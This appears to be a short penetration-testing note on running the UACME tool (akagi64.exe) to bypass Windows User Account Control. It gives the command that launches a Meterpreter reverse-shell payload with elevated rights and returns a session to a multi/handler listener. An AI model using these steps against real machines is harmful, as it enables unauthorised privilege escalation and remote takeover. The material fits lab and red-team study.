### **<mark style="background: #D2B3FFA6;">:LiGithub:</mark> https://github.com/hfiref0x/UACME**
### **<mark style="background: #e74c3c;">:LiYoutube: </mark> https://youtu.be/iOEaKEb9lOE**

- ***Admin account with UAC set on default settings required.***

## **Usage:**

> You need to compile manually if it is not compiled in your system
> 
> Then upload it and also upload a meterpreter reverse tcp
> 
> then :
> 
> **Usage :** **`.\akagi64.exe <method> <parameter>`**
> 
> **method is the method number listed in the repo**
> 
> **parameter is a file to execute which is in our case meterpreter reverse shell**   - can be empty which will execute elevated cmd.exe from system32 folder.

- To execute our payload with admin privileges: `.\Akagi64.exe <method#> C:\Temp\payload.exe`
- Then we will get a session in our listener `multi/handler` Module.

![[Pasted image 20250410153800.png]]